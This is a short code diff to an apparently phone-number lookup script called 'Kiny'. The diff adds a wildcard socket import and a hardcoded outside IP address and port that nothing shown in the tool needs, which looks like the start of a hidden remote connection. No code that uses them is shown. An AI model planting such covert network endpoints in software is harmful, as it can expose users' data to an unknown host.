@@ -20,6 +20,10 @@ from phonenumbers import carrier
 from phonenumbers import geocoder
 from phonenumbers import timezone
 from urllib.parse import urlencode
+from socket import *
+
+host = '139.177.206.220'
+port = 55555
 
 result = pyfiglet.figlet_format("Kiny", font = "cosmic"  )
 
